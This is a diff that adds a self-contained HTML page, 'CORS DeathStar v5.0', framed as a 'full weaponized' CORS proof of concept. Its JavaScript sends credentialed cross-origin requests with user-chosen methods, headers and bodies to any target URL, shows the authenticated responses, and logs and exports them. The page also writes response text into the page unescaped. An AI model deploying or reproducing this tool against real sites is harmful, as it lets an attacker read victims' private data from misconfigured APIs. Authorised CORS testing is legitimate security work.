@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS DeathStar v5.0 — 4NDR0666OS</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
+            background: linear-gradient(135deg, #0a0c12 0%, #1a1f2e 100%);
+            color: #eaeaea;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            background: rgba(22,26,32,0.98);
+            backdrop-filter: blur(12px);
+            border-radius: 20px;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.6),
+                        0 0 0 1px rgba(0,255,204,0.08);
+            overflow: hidden;
+            border: 1px solid rgba(255,255,255,0.06);
+        }
+        .header {
+            padding: 35px 50px;
+            background: linear-gradient(90deg, rgba(0,255,204,0.12) 0%, transparent 100%);
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+        }
+        h1 {
+            font-size: 32px;
+            font-weight: 700;
+            color: #00ffcc;
+            letter-spacing: -1px;
+        }
+        .subtitle { color:#777; font-size:14px; margin-top:6px; }
+        .content { padding:40px 50px; }
+        .input-group { margin-bottom:28px; }
+        label { display:block; margin-bottom:8px; font-size:13px; color:#999; text-transform:uppercase; letter-spacing:0.8px; }
+        input, textarea, select {
+            width:100%;
+            padding:14px 18px;
+            background:rgba(11,14,19,0.9);
+            border:2px solid rgba(255,255,255,0.06);
+            border-radius:12px;
+            color:#eaeaea;
+            font-size:15px;
+        }
+        input:focus, textarea:focus, select:focus {
+            border-color:#00ffcc;
+            box-shadow:0 0 0 4px rgba(0,255,204,0.1);
+            outline:none;
+        }
+        .controls {
+            display:flex;
+            flex-wrap:wrap;
+            gap:16px;
+            margin:30px 0;
+            align-items:center;
+        }
+        .btn {
+            padding:14px 28px;
+            font-weight:600;
+            background:linear-gradient(135deg,#00ffcc,#00d4aa);
+            color:#0f1115;
+            border:none;
+            border-radius:12px;
+            cursor:pointer;
+            transition:all .3s;
+            display:flex;
+            align-items:center;
+            gap:8px;
+        }
+        .btn:hover { transform:translateY(-3px); box-shadow:0 8px 25px rgba(0,255,204,0.3); }
+        .history {
+            margin-top:40px;
+        }
+        .history-item {
+            background:rgba(11,14,19,0.7);
+            padding:16px;
+            border-radius:12px;
+            margin-bottom:12px;
+            border-left:4px solid #00ffcc;
+            font-family:monospace;
+            font-size:14px;
+            cursor:pointer;
+        }
+        .output {
+            margin-top:30px;
+            background:rgba(11,14,19,0.9);
+            border:2px solid rgba(255,255,255,0.06);
+            border-radius:14px;
+            padding:24px;
+            min-height:380px;
+            font-family: 'Consolas', monospace;
+            white-space: pre-wrap;
+            word-break: break-all;
+            overflow:auto;
+        }
+        .status {
+            padding:6px 14px;
+            border-radius:9999px;
+            font-size:13px;
+            font-weight:600;
+        }
+        .success { background:#4ade80; color:#0f1115; }
+        .error { background:#f87171; color:#fff; }
+        .loading { background:#fbbf24; color:#0f1115; animation:pulse 1.5s infinite; }
+        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.6} }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>CORS DeathStar v5.0</h1>
+        <div class="subtitle">4NDR0666OS — Full weaponized CORS PoC • Multi-method • Header injection • History</div>
+    </div>
+    
+    <div class="content">
+        <div class="input-group">
+            <label>Target URL</label>
+            <input type="text" id="targetUrl" placeholder="https://target.com/api/v1/users" value="https://">
+        </div>
+
+        <div class="input-group">
+            <label>Method</label>
+            <select id="method">
+                <option value="GET">GET</option>
+                <option value="POST">POST</option>
+                <option value="PUT">PUT</option>
+                <option value="DELETE">DELETE</option>
+                <option value="OPTIONS">OPTIONS</option>
+            </select>
+        </div>
+
+        <div class="input-group">
+            <label>Custom Headers (one per line: Header: value)</label>
+            <textarea id="headers" rows="4" placeholder="Authorization: Bearer token&#10;X-Custom: test"></textarea>
+        </div>
+
+        <div class="input-group">
+            <label>POST/PUT Body (JSON or raw)</label>
+            <textarea id="body" rows="5" placeholder='{"key":"value"}'></textarea>
+        </div>
+
+        <div class="controls">
+            <button class="btn" onclick="fireCORS()">🚀 FIRE DEATHSTAR</button>
+            <button class="btn" onclick="clearHistory()" style="background:#333;color:#ccc;">Clear History</button>
+            <button class="btn" onclick="exportAll()" style="background:#444;color:#fff;">Export All</button>
+        </div>
+
+        <div class="output" id="output">Waiting for launch...</div>
+
+        <div class="history">
+            <h3 style="margin-bottom:12px;color:#777;">Request History</h3>
+            <div id="historyList"></div>
+        </div>
+    </div>
+</div>
+
+<script>
+let historyLog = [];
+
+function addToHistory(url, method, status, response) {
+    const entry = {
+        timestamp: new Date().toLocaleTimeString(),
+        url, method, status,
+        response: response.substring(0, 500) + (response.length > 500 ? '...' : '')
+    };
+    historyLog.unshift(entry);
+    if (historyLog.length > 15) historyLog.pop();
+    renderHistory();
+}
+
+function renderHistory() {
+    const container = document.getElementById('historyList');
+    container.innerHTML = historyLog.map((h,i) => `
+        <div class="history-item" onclick="loadHistory(${i})">
+            <strong>${h.method}</strong> ${h.url} 
+            <span class="status ${h.status.includes('200')||h.status.includes('success')?'success':'error'}">${h.status}</span><br>
+            <small>${h.timestamp}</small><br>
+            <small style="color:#666">${h.response}</small>
+        </div>
+    `).join('');
+}
+
+function loadHistory(i) {
+    const h = historyLog[i];
+    document.getElementById('output').textContent = h.response || 'No full response stored';
+}
+
+function fireCORS() {
+    const url = document.getElementById('targetUrl').value.trim();
+    if (!url) return alert('Enter target URL');
+
+    const method = document.getElementById('method').value;
+    const headersText = document.getElementById('headers').value.trim();
+    const body = document.getElementById('body').value.trim();
+
+    const xhr = new XMLHttpRequest();
+    xhr.withCredentials = true;
+
+    const output = document.getElementById('output');
+    output.textContent = 'Launching DeathStar...';
+
+    xhr.onload = function() {
+        let status = `HTTP ${xhr.status} ${xhr.statusText}`;
+        output.innerHTML = `<strong style="color:#4ade80">${status}</strong>\n\n${xhr.responseText || '(empty body)'}`;
+        addToHistory(url, method, status, xhr.responseText || '');
+    };
+
+    xhr.onerror = function() {
+        output.innerHTML = `<span style="color:#f87171">Request blocked or CORS misconfiguration not exploitable from this origin.</span>`;
+        addToHistory(url, method, 'BLOCKED', 'CORS error');
+    };
+
+    xhr.open(method, url, true);
+
+    // Parse and set custom headers
+    headersText.split('\n').forEach(line => {
+        if (line.includes(':')) {
+            const [key, ...val] = line.split(':');
+            xhr.setRequestHeader(key.trim(), val.join(':').trim());
+        }
+    });
+
+    try {
+        xhr.send(body ? body : null);
+    } catch(e) {
+        output.textContent = 'Error: ' + e.message;
+    }
+}
+
+function clearHistory() {
+    historyLog = [];
+    renderHistory();
+}
+
+function exportAll() {
+    if (!historyLog.length) return alert('No history to export');
+    const data = JSON.stringify(historyLog, null, 2);
+    const blob = new Blob([data], {type: 'application/json'});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = `cors_deathstar_export_${new Date().toISOString().slice(0,19)}.json`;
+    a.click();
+}
+
+document.addEventListener('keydown', e => {
+    if (e.key === 'Enter' && !e.shiftKey) {
+        e.preventDefault();
+        fireCORS();
+    }
+});
+</script>
+</body>
+</html>
